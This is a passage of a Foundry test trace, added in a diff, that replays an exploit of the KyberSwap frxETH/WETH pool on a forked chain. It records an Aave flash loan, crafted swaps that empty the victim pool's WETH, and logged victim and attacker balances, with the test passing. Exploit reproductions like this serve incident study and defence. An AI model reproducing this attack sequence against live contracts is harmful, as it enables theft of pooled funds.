+    │   │   │   │   │   └─ ← [Return] 1158014628889345 [1.158e15], 17968269307782871 [1.796e16], 0
+    │   │   │   │   ├─ [32655] KS2-RT::swap(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 387170294533119999999 [3.871e20], false, 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
+    │   │   │   │   │   ├─ [2238] ERC1967Proxy::fallback(1700693699 [1.7e9], 110909 [1.109e5], 74692747583654757908 [7.469e19])
+    │   │   │   │   │   │   ├─ [1828] PoolOracle::write(1700693699 [1.7e9], 110909 [1.109e5], 74692747583654757908 [7.469e19]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   ├─ [3095] frxETH::transfer(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5789927137555359 [5.789e15])
+    │   │   │   │   │   │   ├─ emit Transfer(from: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], to: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5789927137555359 [5.789e15])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd7c269a0d19630ff9df51948df7e789682b56729f9ef30ffed2a5ddcecda4cf0: 0x0000000000000000000000000000000000000000000000000014989e4e48a090 → 0x000000000000000000000000000000000000000000000000000006b5d7f96cf1
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000005851c1d535c4e0fd → 0x000000000000000000000000000000000000000000000000586653bdac14149c
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 9074198690435299359 [9.074e18]
+    │   │   │   │   │   ├─ [5151] KyberswapFrxEthWethPoolExploitTest::swapCallback(-5789927137555359 [-5.789e15], 387170294533119999999 [3.871e20], 0x)
+    │   │   │   │   │   │   ├─ [3262] WETH::transfer(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], 387170294533119999999 [3.871e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 387170294533119999999 [3.871e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c0b059dfaa3dbb687 → 0x0000000000000000000000000000000000000000000000570df46a6ad5e0b688
+    │   │   │   │   │   │   │   │   @ 0xe6f32bf663f0a298de74a03c36a0b63c3142f5009d3fa0261cf593637f4e2fc5: 0x0000000000000000000000000000000000000000000000007dee07a1bcb5f81f → 0x0000000000000000000000000000000000000000000000157aff3b318ab0f81e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 396244493223555299358 [3.962e20]
+    │   │   │   │   │   ├─ emit Swap(sender: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], deltaQty0: -5789927137555359 [-5.789e15], deltaQty1: 387170294533119999999 [3.871e20], sqrtP: 20693058119558072255665971001964 [2.069e31], liquidity: 74692747583654757908 [7.469e19], currentTick: 111310 [1.113e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 3: 0x00000000000001b13d01b13d0000000000000100000000000000000000000000 → 0x00000000000001b2ce01b2ce00000000000001052ee07dadaef6dfba118dfa6c
+    │   │   │   │   │   │   @ 4: 0x0000000000000000000693d94910842d00000000000000040c91f2302da88614 → 0x00000000000000000006d89fc0822d8400000000000000040c91f2302da88614
+    │   │   │   │   │   └─ ← [Return] -5789927137555359 [-5.789e15], 387170294533119999999 [3.871e20]
+    │   │   │   │   ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 396244493223555299358 [3.962e20]
+    │   │   │   │   ├─ [101852] KS2-RT::swap(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], -396244493223555299358 [-3.962e20], false, 4295128740 [4.295e9], 0x)
+    │   │   │   │   │   ├─ [406] 0xC7a590291e07B9fe9E64b86c58fD8fC764308C4A::feeConfiguration() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x91c9D4373B077eF8082F468C7c97f2c499e36F5b, 16000 [1.6e4]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x91c9D4373B077eF8082F468C7c97f2c499e36F5b, value: 12095353652917 [1.209e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 63500606677816 [6.35e13])
+    │   │   │   │   │   ├─ [2238] ERC1967Proxy::fallback(1700693699 [1.7e9], 111310 [1.113e5], 74692747583654757908 [7.469e19])
+    │   │   │   │   │   │   ├─ [1828] PoolOracle::write(1700693699 [1.7e9], 111310 [1.113e5], 74692747583654757908 [7.469e19]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   │   └─ ← [Return] 0, 1
+    │   │   │   │   │   ├─ [3262] WETH::transfer(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 396244493223555299358 [3.962e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], to: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 396244493223555299358 [3.962e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe6f32bf663f0a298de74a03c36a0b63c3142f5009d3fa0261cf593637f4e2fc5: 0x0000000000000000000000000000000000000000000000157aff3b318ab0f81e → 0
+    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000570df46a6ad5e0b688 → 0x00000000000000000000000000000000000000000000006c88f3a59c6091aea6
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 7378082295025 [7.378e12]
+    │   │   │   │   │   ├─ [4969] KyberswapFrxEthWethPoolExploitTest::swapCallback(5868809110205016 [5.868e15], -396244493223555299358 [-3.962e20], 0x)
+    │   │   │   │   │   │   ├─ [3095] frxETH::transfer(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], 5868809110205016 [5.868e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703], value: 5868809110205016 [5.868e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xd7c269a0d19630ff9df51948df7e789682b56729f9ef30ffed2a5ddcecda4cf0: 0x000000000000000000000000000000000000000000000000000006b5d7f96cf1 → 0x0000000000000000000000000000000000000000000000000014e05c723e1f49
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000000586653bdac14149c → 0x00000000000000000000000000000000000000000000000058517a1711cf6244
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5876187192500041 [5.876e15]
+    │   │   │   │   │   ├─ emit Swap(sender: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], deltaQty0: 5868809110205016 [5.868e15], deltaQty1: -396244493223555299358 [-3.962e20], sqrtP: 20482897903346086648868989510468 [2.048e31], liquidity: 149385495167309515816 [1.493e20], currentTick: 111105 [1.111e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x97272f5efc5a2d53be7c6d748ffedb9ab54824b4192f15eeb969110092c359de: 0x00000000000000000000000000000000000000000000000000010d5707a5062e → 0x0000000000000000000000000000000000000000000000000001185732e70ce3
+    │   │   │   │   │   │   @ 5: 0x000000000000000000000000000000000000000000000000000693d94910842d → 0x0000000000000000000000000000000000000000000000000006d89fc0822d84
+    │   │   │   │   │   │   @ 3: 0x00000000000001b2ce01b2ce00000000000001052ee07dadaef6dfba118dfa6c → 0x00000000000001b20101b13d000000000000010287d008d8549ed00f64d72344
+    │   │   │   │   │   │   @ 0x08af64ec66eeb0a9323d9ab71dece11c266bdc49eb90ae49f68e1020935039b3: 0 → 0x0000000000000000000000000000000000000000000000000001475eeb49ba92
+    │   │   │   │   │   │   @ 6: 0x000000000000000000000000000000000000000000000eb61564738294cec092 → 0x000000000000000000000000000000000000000000001cf97b8dcf71254117c7
+    │   │   │   │   │   │   @ 4: 0x00000000000000000006d89fc0822d8400000000000000040c91f2302da88614 → 0x000000000000000000071e544950486800000000000000081923e4605b510c28
+    │   │   │   │   │   │   @ 10: 0x0000000000000000000000000000000000000000000000000006935fefc76708 → 0x0000000000000000000000000000000000000000000000000006d820fe2410f5
+    │   │   │   │   │   │   @ 0x08af64ec66eeb0a9323d9ab71dece11c266bdc49eb90ae49f68e1020935039b2: 0 → 0x000000000000000000000000000000000000000000001cf97b8dcf71254117c7
+    │   │   │   │   │   │   @ 0x068b4c0c6d267dccfd56de6cbdeaad93727602837f6d64e4ccf9f8e9a0c13923: 0x00000000000000000000000000000000000000000000000000058608e82260da → 0x0000000000000000000000000000000000000000000000000005bfc9cb3d0412
+    │   │   │   │   │   └─ ← [Return] 5868809110205016 [5.868e15], -396244493223555299358 [-3.962e20]
+    │   │   │   │   ├─ [24420] WETH::approve(Aave: Pool V3: [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2], 2001000000000000000000 [2.001e21])
+    │   │   │   │   │   ├─ emit Approval(owner: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Aave: Pool V3: [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2], value: 2001000000000000000000 [2.001e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x25cbec550bea5151a13d72347c0f06143405a3509479bf3ef450a310b3b96faf: 0 → 0x00000000000000000000000000000000000000000000006c7974123f64a40000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [7468] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledTotalSupply() [staticcall]
+    │   │   │   │   ├─ [2419] VariableDebtToken::scaledTotalSupply() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 311830609214326307204640 [3.118e23]
+    │   │   │   │   └─ ← [Return] 311830609214326307204640 [3.118e23]
+    │   │   │   ├─ [9982] 0x102633152313C81cD80419b6EcF66d14Ad68949A::getSupplyData() [staticcall]
+    │   │   │   │   ├─ [4921] StableDebtToken::getSupplyData() [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   ├─ [4841] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   ├─ [4324] AToken::totalSupply() [delegatecall]
+    │   │   │   │   │   ├─ [1359] Aave: Pool V3::fallback(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   ├─ [807] Pool::getReserveNormalizedIncome(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1016011937618846717957650137 [1.016e27]
+    │   │   │   │   │   │   └─ ← [Return] 1016011937618846717957650137 [1.016e27]
+    │   │   │   │   │   └─ ← [Return] 410883374566951835106367 [4.108e23]
+    │   │   │   │   └─ ← [Return] 410883374566951835106367 [4.108e23]
+    │   │   │   ├─ [5160] 0xA901Bf68Bebde17ba382e499C3e9EbAe649DF276::calculateInterestRates((0, 2001000000000000000000 [2.001e21], 0, 0, 321115061540020509033243 [3.211e23], 0, 1500, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8)) [staticcall]
+    │   │   │   │   ├─ [534] WETH::balanceOf(InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 87781202350445988509445 [8.778e22]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000f0787f455da3b36522da7000000000000000000000000000000000000000000504c66b518d4a19646359c00000000000000000000000000000000000000000016a018af5ee18e2d6458ba
+    │   │   │   ├─ emit ReserveDataUpdated(reserve: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], liquidityRate: 18169451776267742050659751 [1.816e25], stableBorrowRate: 97074860039177656169018780 [9.707e25], variableBorrowRate: 27352402027424359318313146 [2.735e25], liquidityIndex: 1016014409302412833201691231 [1.016e27], variableBorrowIndex: 1029774024907583222593588885 [1.029e27])
+    │   │   │   ├─ [4148] WETH::transferFrom(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], 2001000000000000000000 [2.001e21])
+    │   │   │   │   ├─ emit Transfer(from: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], value: 2001000000000000000000 [2.001e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c88f3a59c6091aea6 → 0x0000000000000000000000000000000000000000000000000f7f935cfbedaea6
+    │   │   │   │   │   @ 0x25cbec550bea5151a13d72347c0f06143405a3509479bf3ef450a310b3b96faf: 0x00000000000000000000000000000000000000000000006c7974123f64a40000 → 0
+    │   │   │   │   │   @ 0xb064600732a82908427d092d333e607598a6238a59aeb45e1288cb0bac7161cf: 0x000000000000000000000000000000000000000000001296a0e654fce9bd7705 → 0x0000000000000000000000000000000000000000000013031a5a673c4e617705
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1136] InitializableImmutableAdminUpgradeabilityProxy::fallback(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2001000000000000000000 [2.001e21])
+    │   │   │   │   ├─ [578] AToken::handleRepayment(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2001000000000000000000 [2.001e21]) [delegatecall]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ emit FlashLoan(target: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], initiator: KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], asset: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], amount: 2000000000000000000000 [2e21], interestRateMode: 0, premium: 1000000000000000000 [1e18], referralCode: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec1: 0x000000000016a01c4b2eb5f2711e78ef000000000353cf21bfaa9e60d0eb8e95 → 0x000000000016a018af5ee18e2d6458ba000000000353cf21bfaa9e60d0eb8e95
+    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec7: 0x000000000000000000000000000000000000000000000000b00046621ae9fb06 → 0x000000000000000000000000000000000000000000000000b001ac7269b0ac54
+    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec0: 0x00000000000f078cbfa9a4d534e5565d0000000003486ce5807b13f6e02c36d9 → 0x00000000000f0787f455da3b36522da70000000003486d6b7dfb17ce2e059a5f
+    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec2: 0x000000000000000000000000655e86c30000000000504c6bdcd4040c402b8832 → 0x000000000000000000000000655e86c30000000000504c66b518d4a19646359c
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [629] frxETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   └─ ← [Return] 5876187192500041 [5.876e15]
+    ├─ [289] frxETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ after ]  [ token0 ]  [ victim ] ", val: 5876187192500041 [5.876e15], decimals: 18)
+    ├─ [534] WETH::balanceOf(KS2-RT: [0xFd7B111AA83b9b6F547E617C7601EfD997F64703]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ after ]  [ token1 ]  [ victim ] ", val: 0, decimals: 18)
+    ├─ [629] frxETH::balanceOf(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 6364001987952861764 [6.364e18]
+    ├─ [289] frxETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ after ]  [ token0 ]  [ attacker ] ", val: 6364001987952861764 [6.364e18], decimals: 18)
+    ├─ [534] WETH::balanceOf(KyberswapFrxEthWethPoolExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1116773260184104614 [1.116e18]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " [ after ]  [ token1 ]  [ attacker ] ", val: 1116773260184104614 [1.116e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.13s (19.68s CPU time)
+
+Ran 1 test suite in 24.33s (21.13s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
